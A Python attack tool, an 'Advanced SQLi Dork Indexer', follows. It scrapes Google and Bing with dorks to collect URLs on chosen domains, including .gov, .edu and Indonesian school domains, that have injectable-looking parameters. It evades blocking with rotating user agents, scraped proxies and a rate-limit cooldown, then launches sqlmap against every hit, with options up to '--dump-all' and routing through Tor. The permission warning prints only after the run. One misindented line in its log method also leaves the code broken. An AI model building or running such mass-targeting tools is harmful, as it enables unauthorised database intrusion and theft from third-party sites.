import requests
from bs4 import BeautifulSoup
import sys
import csv
import json
import time
import random
from urllib.parse import urlparse, parse_qs, unquote
from tqdm import tqdm
from datetime import datetime
import os
import argparse
from concurrent.futures import ThreadPoolExecutor
from concurrent.futures import as_completed
import threading
from colorama import init, Fore, Style
import shutil
import subprocess

from downloader import check_proxy

DOMAIN_OPTIONS = [
    '.com',
    '.sch.id',
    '.id',
    '.org',
    '.edu',
    '.gov',
    '.net',
    '.co.id'
]

init(autoreset=True)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
]

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PAYLOADS_DIR = os.path.join(SCRIPT_DIR, '..', 'payloads')
DORK_FILE_PATH = os.path.join(PAYLOADS_DIR, 'dork.txt')
PROXY_FILE_PATH = os.path.join(PAYLOADS_DIR, 'proxies.txt')

def _get_wib_timestamp():
    return datetime.now().strftime('%Y-%m-%d_%H-%M-%S')

def log(level, msg):
    timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    color_map = {
        "info": Fore.CYAN, "success": Fore.GREEN, "warn": Fore.YELLOW,
        "error": Fore.RED, "run": Fore.MAGENTA
    }
    icon_map = {"info": "ℹ️", "success": "✅", "warn": "⚠️", "error": "❌", "run": "🚀"}
    color = color_map.get(level, Fore.WHITE)
    print(f"{color}[{timestamp}] {icon_map.get(level, ' ')} {msg}{Style.RESET_ALL}")


class SQLiIndexer:
    def __init__(self, target_domain, search_engines, num_dorks=10, num_pages=3, threads=10, proxy_file=None, output_file=None):
        self.session = requests.Session()
        self.results = []
        self.num_dorks = num_dorks
        self.num_pages = num_pages
        self.threads = threads
        self.search_engines = search_engines
        self.target_domain = f"inurl:*{target_domain}"
        self.dorks = self.load_dorks()
        self.proxies = self.load_proxies(proxy_file)

        self.rate_limit_lock = threading.Lock()
        self.rate_limit_until = 0

        output_base_dir = os.path.join(SCRIPT_DIR, '..', 'output')
        run_dir_name = f"{target_domain.replace('.', '_')}_{_get_wib_timestamp()}"
        self.run_output_dir = os.path.join(output_base_dir, run_dir_name)
        os.makedirs(self.run_output_dir, exist_ok=True)

        self.csv_output_file = output_file or os.path.join(self.run_output_dir, "results.csv")
        self.url_output_file = os.path.join(self.run_output_dir, "urls.txt")
        self.json_output_file = os.path.join(self.run_output_dir, "results.json")

    def load_dorks(self):
        try:
            with open(DORK_FILE_PATH, 'r', encoding='utf-8') as f:
                dorks = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            if not dorks:
                self.log("error", "dork.txt file is empty or invalid. Exiting.")
                sys.exit(1)
            self.log("success", f"Successfully loaded {len(dorks)} dorks from {os.path.basename(DORK_FILE_PATH)}.")
            return dorks
        except FileNotFoundError:
            self.log("warn", f"Dork file not found at '{DORK_FILE_PATH}'.")
            self.create_example_dork_file()
            self.log("info", "Please fill the file with your desired dorks, then run the master script again.")
            sys.exit(0)
        except Exception as e:
            self.log("error", f"Failed to load dork.txt: {e}. Exiting.")
            sys.exit(1)

    def create_example_dork_file(self):
        os.makedirs(os.path.dirname(DORK_FILE_PATH), exist_ok=True)
        with open(DORK_FILE_PATH, 'w', encoding='utf-8') as f:
            f.write("inurl:gallery.php?id=\n")
            f.write("inurl:article.php?id=\n")
        self.log("info", f"Example file has been created at '{DORK_FILE_PATH}'. Please fill it with relevant dorks.")

    def load_proxies(self, proxy_file):
        if not proxy_file:
            return []
        try:
            with open(proxy_file, 'r') as f:
                proxies = [line.strip() for line in f if line.strip()]
            if proxies:
                self.log("success", f"Successfully loaded {len(proxies)} proxies from {proxy_file}.")
            return proxies
        except FileNotFoundError:
            self.log("warn", f"Proxy file '{proxy_file}' not found. Continuing without proxy.")
            return []

    def log(self, level, msg):
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        color_map = {
            "info": Fore.CYAN,
            "success": Fore.GREEN,
            "warn": Fore.YELLOW,
            "error": Fore.RED,
            "run": Fore.MAGENTA
        }
    icon_map = {"info": "[INFO]", "success": "[SUCCESS]", "warn": "[WARN]", "error": "[ERROR]", "run": "[RUN]"}
        color = color_map.get(level, Fore.WHITE)
        print(f"{color}[{timestamp}] {icon_map.get(level, ' ')} {msg}{Style.RESET_ALL}")

    def get_proxy(self):
        if not self.proxies:
            return None
        proxy = random.choice(self.proxies)
        return {'http': proxy, 'https': proxy}

    def search_google_page(self, dork, page):
        base_url = 'https://www.google.com/search'
        full_dork = f"{dork} {self.target_domain}"
        
        params = {
            'q': full_dork,
            'num': 10,
            'start': page * 10,
            'hl': 'en'
        }
        
        max_retries = 3
        backoff_factor = 30
        for attempt in range(max_retries):
            with self.rate_limit_lock:
                if time.time() < self.rate_limit_until:
                    sleep_duration = self.rate_limit_until - time.time()
                    time.sleep(sleep_duration) if sleep_duration > 0 else None

            try:
                headers = {'User-Agent': random.choice(USER_AGENTS)}
                proxy_dict = self.get_proxy()
                time.sleep(random.uniform(2, 5))
                r = self.session.get(base_url, params=params, headers=headers, proxies=proxy_dict, timeout=10)
                r.raise_for_status()
                
                soup = BeautifulSoup(r.text, 'html.parser')
                for result in soup.find_all('div', class_='g'):
                    a = result.find('a')
                    if a and a.get('href'):
                        href = a['href']
                        if href.startswith('/url?q='):
                            actual_url = unquote(href.split('/url?q=')[1].split('&')[0])
                            parsed = urlparse(actual_url)
                            
                            if parsed.netloc.endswith(self.target_domain.replace('inurl:*', '')):
                                query_params = parse_qs(parsed.query)
                                if any(param in query_params for param in ['id', 'cat', 'page', 'product', 'item', 'cart']):
                                    title = result.find('h3')
                                    title_text = title.get_text() if title else 'N/A'
                                    
                                    self.results.append({
                                        'dork': full_dork,
                                        'url': actual_url,
                                        'title': title_text,
                                        'potential_sqli': 'Yes (parameters: {})'.format(', '.join(query_params.keys()))
                                    })
                return 
            except requests.exceptions.HTTPError as e:
                if e.response.status_code == 429:
                    with self.rate_limit_lock:
                        wait_time = backoff_factor * (attempt + 1)
                        
                        if time.time() + wait_time > self.rate_limit_until:
                            self.rate_limit_until = time.time() + wait_time
                            self.log("warn", f"Google: Rate limit detected! Activating global cooldown for {wait_time} seconds.")
                    time.sleep(wait_time)
                else:
                    self.log("warn", f"Google: HTTP Error while searching '{full_dork}' (page {page+1}): {e}")
                    continue
            except requests.RequestException as e:
                self.log("warn", f"Google: Failed to search '{full_dork}' (page {page+1}): {e}")
                if proxy_dict:
                    proxy_address = next(iter(proxy_dict.values())).split('//')[1]
                    self.remove_proxy(proxy_address)
                continue

    def remove_proxy(self, proxy_address):
        if proxy_address in self.proxies:
            self.proxies.remove(proxy_address)
            self.log("warn", f"Removed unresponsive proxy: {proxy_address}. Remaining proxies: {len(self.proxies)}")

    def search_bing_page(self, dork, page):
        """Search on Bing using dorks and return potential URLs."""
        base_url = 'https://www.bing.com/search'
        full_dork = f"{dork} site:{self.target_domain.replace('inurl:*', '')}"

        
        params = {
            'q': full_dork,
            'first': page * 10 + 1
        }

        try:
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            proxy_dict = self.get_proxy()
            time.sleep(random.uniform(1, 3)) 
            r = self.session.get(base_url, params=params, headers=headers, proxies=proxy_dict, timeout=10)
            r.raise_for_status()

            soup = BeautifulSoup(r.text, 'html.parser')
            
            for result in soup.find_all('li', class_='b_algo'):
                a = result.find('a')
                if a and a.get('href'):
                    actual_url = a['href']
                    parsed = urlparse(actual_url)

                    if parsed.netloc and parsed.netloc.endswith(self.target_domain.replace('inurl:*', '')):
                        query_params = parse_qs(parsed.query)
                        if any(param in query_params for param in ['id', 'cat', 'page', 'product', 'item', 'cart']):
                            title = result.find('h2')
                            title_text = title.get_text() if title else 'N/A'

                            self.results.append({
                                'dork': full_dork,
                                'url': actual_url,
                                'title': title_text,
                                'potential_sqli': 'Yes (parameters: {})'.format(', '.join(query_params.keys()))
                            })
        except requests.RequestException as e:
            self.log("warn", f"Bing: Failed to search '{full_dork}' (page {page+1}): {e}")
            if proxy_dict:
                proxy_address = next(iter(proxy_dict.values())).split('//')[1]
                self.remove_proxy(proxy_address)

    def search_page(self, engine, dork, page):
        if engine == 'google':
            self.search_google_page(dork, page)
        elif engine == 'bing':
            self.search_bing_page(dork, page)

    def save_results(self):
        if not self.results:
            return

        unique_results = {res['url']: res for res in self.results}.values()
        self.results = list(unique_results)

        with open(self.csv_output_file, 'w', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=['dork', 'url', 'title', 'potential_sqli'])
            writer.writeheader()
            writer.writerows(self.results)
        
        self.log("success", f"CSV results saved to {self.csv_output_file}")

        with open(self.url_output_file, 'w', encoding='utf-8') as f:
            for res in self.results:
                f.write(res['url'] + '\n')
        self.log("success", f"URL list saved to {self.url_output_file}")

        with open(self.json_output_file, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=4)
        self.log("success", f"JSON results saved to {self.json_output_file}")
        self.log("info", f"All reports are saved in the directory: {self.run_output_dir}")

    def run_indexing(self):
        selected_dorks = random.sample(self.dorks, min(self.num_dorks, len(self.dorks)))
        tasks = [(engine, dork, page) for engine in self.search_engines for dork in selected_dorks for page in range(self.num_pages)]

        self.log("run", f"Starting indexing with {len(selected_dorks)} dorks on {len(self.search_engines)} search engines ({', '.join(self.search_engines)}).")
        self.log("info", f"Target Domain: {self.target_domain}")
        
        try:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                with tqdm(total=len(tasks), desc="Searching Dorks", ascii=True) as pbar:
                    futures = [executor.submit(self.search_page, engine, dork, page) for engine, dork, page in tasks]
                    for future in as_completed(futures):
                        pbar.update(1)
        except KeyboardInterrupt:
            self.log("warn", "Process interrupted by user (Ctrl+C).")
            return
        
        self.save_results()
        
        if self.results:
            self.log("success", f"Indexing finished! Total of {len(self.results)} potential SQLi vulnerable sites found.")
            self.prompt_for_sqlmap()
        else:
            self.log("info", "Indexing finished. No potential URLs found with the current criteria.")

    def prompt_for_sqlmap(self):
        if not shutil.which("sqlmap"):
            self.log("warn", "SQLMap not found in your system's PATH. Skipping automatic scan.")
            self.log("warn", "You can run a manual scan with: sqlmap -m " + self.url_output_file)
            return

        print("\n" + "="*60)
        if input("🚀 Do you want to directly scan the results with SQLMap? (y/n): ").lower() != 'y':
            self.log("info", "SQLMap scan skipped. You can run it manually later.")
            return

        print("\nSelect SQLMap scan level:")
        print("   1. Fast (level=1, risk=1, --batch)")
        print("   2. Medium (level=3, risk=2, --dbs)")
        print("   3. Deep (level=5, risk=3, --dump-all)")
        print("   4. Fast via Tor (if installed)")
        
        while True:
            try:
                choice = int(input("   Enter number (1-4): "))
                if 1 <= choice <= 4:
                    break
                else:
                    print("   ❌ Invalid number. Try again.")
            except ValueError:
                print("   ❌ Enter a valid number.")

        sqlmap_options = {
            1: "--level=1 --risk=1 --batch --random-agent",
            2: "--level=3 --risk=2 --dbs --random-agent",
            3: "--level=5 --risk=3 --dump-all --random-agent",
            4: "--level=1 --risk=1 --batch --random-agent --tor --tor-type=SOCKS5"
        }

        command = f"sqlmap -m {self.url_output_file} {sqlmap_options[choice]}"
        self.log("run", f"Running command: {command}")
        subprocess.run(command, shell=True)
        self.log("success", "SQLMap scan finished.")

def display_banner():
    banner_text = "   🚀 Advanced SQLi Dork Indexer - v2.1 🚀"
    print("="*60)
    print(Fore.CYAN + Style.BRIGHT + banner_text + Style.RESET_ALL)
    print("="*60)
    print("This tool will search for potentially SQLi vulnerable URLs using Google Dorks.")
    print()

def get_interactive_choices():
    print("1. Select target domain for search:")
    for i, domain in enumerate(DOMAIN_OPTIONS, 1):
        print(f"   {i}. {domain}")
    print(f"   {len(DOMAIN_OPTIONS) + 1}. Enter custom domain")
    
    while True:
        try:
            choice = int(input(f"   Enter number (1-{len(DOMAIN_OPTIONS) + 1}): "))
            if 1 <= choice <= len(DOMAIN_OPTIONS):
                target_domain = DOMAIN_OPTIONS[choice - 1].lstrip('.')
                break
            elif choice == len(DOMAIN_OPTIONS) + 1:
                custom = input("   Enter custom domain (e.g., example.com or go.id): ")
                target_domain = custom.strip().lstrip('.')
                break
            else:
                print("   ❌ Invalid number. Try again.")
        except ValueError:
            print("   ❌ Enter a valid number.")
    
    print("\n2. Select search engines (separate with comma, e.g., 1,2):")
    print("   1. Google")
    print("   2. Bing")
    search_engines = []
    while not search_engines:
        engine_choices = input("   Enter number (default: 1): ") or "1"
        selected_indices = [c.strip() for c in engine_choices.split(',')]
        if '1' in selected_indices: search_engines.append('google')
        if '2' in selected_indices: search_engines.append('bing')
        if not search_engines:
            print("   ❌ Invalid choice. Try again.")


    while True:
        try:
            pages_input = input("\n3. How many pages to dork per dork? (default: 3): ")
            num_pages = int(pages_input) if pages_input else 3
            break
        except ValueError:
            print("   ❌ Enter a valid number.")

    def get_numeric_input(prompt, default):
        while True:
            try:
                val = input(f"4. {prompt} (default: {default}): ")
                return int(val) if val else default
            except ValueError:
                print("   ❌ Enter a valid number.")

    num_dorks = get_numeric_input("Number of random dorks to use", 20)
    threads = get_numeric_input("Number of threads for searching", 10)

    proxy_file = None
    proxy_choice = input("5. Do you want to use a proxy? (y/n/auto, default: auto): ").lower() or "auto"
    if proxy_choice == 'y':
        proxy_file = input("   Enter the path to your proxy file: ").strip()
        if not os.path.exists(proxy_file):
            print(f"   ❌ File not found at '{proxy_file}'. Continuing without proxy.")
            proxy_file = None
    elif proxy_choice == 'auto':
        proxy_file = PROXY_FILE_PATH
        needs_download = True
        if os.path.exists(proxy_file) and os.path.getsize(proxy_file) > 0:
            log("info", f"Proxy file '{os.path.basename(proxy_file)}' found. Verifying quality...")
            with open(proxy_file, 'r') as f:
                existing_proxies = [line.strip() for line in f if line.strip()]
            
            sample_size = min(20, len(existing_proxies))
            sample_proxies = random.sample(existing_proxies, sample_size)
            active_count = 0
            with ThreadPoolExecutor(max_workers=20) as executor:
                futures = [executor.submit(check_proxy, p) for p in sample_proxies]
                for future in as_completed(futures):
                    if future.result():
                        active_count += 1
            
            if (active_count / sample_size) >= 0.5:
                log("success", f"Existing proxy quality is good ({active_count}/{sample_size} active). Using existing proxies.")
                needs_download = False
        if needs_download:
            log("run", "Running automatic proxy downloader from misc/downloader.py...")
            command = f"python3 {os.path.join(SCRIPT_DIR, 'downloader.py')} --count 50"
            result = subprocess.run(command, shell=True, check=False)
            if result.returncode != 0:
                print("   ❌ Failed to automatically collect proxies. Continuing without proxy.")
                proxy_file = None
    else:
        proxy_file = None

    print("\n" + "-"*60)
    print("🔍 Configuration Summary:")
    print(f"   - Target Domain      : *.{target_domain}")
    print(f"   - Search Engines     : {', '.join(search_engines)}")
    print(f"   - Dorks per Engine   : {num_dorks}")
    print(f"   - Pages per Dork   : {num_pages}")
    print(f"   - Threads            : {threads}")
    print(f"   - Proxy File         : {proxy_file or 'Not used'}")
    print("-"*60)

    if input("🚀 Start indexing process with this configuration? (y/n): ").lower() != 'y':
        print("❌ Process canceled.")
        sys.exit(0)

    return {
        "target_domain": target_domain,
        "search_engines": search_engines,
        "num_dorks": num_dorks,
        "num_pages": num_pages,
        "threads": threads,
        "proxy_file": proxy_file
    }

if __name__ == "__main__":
    display_banner()
    choices = get_interactive_choices()
    indexer = SQLiIndexer(**choices)
    indexer.run_indexing()
    print("\n" + Fore.YELLOW + "="*60)
    print(Fore.YELLOW + "⚠️  IMPORTANT: Make sure you have explicit permission to test the sites found!")
    print(Fore.YELLOW + "   Testing sites without permission is illegal.")
    print(Fore.YELLOW + "="*60)
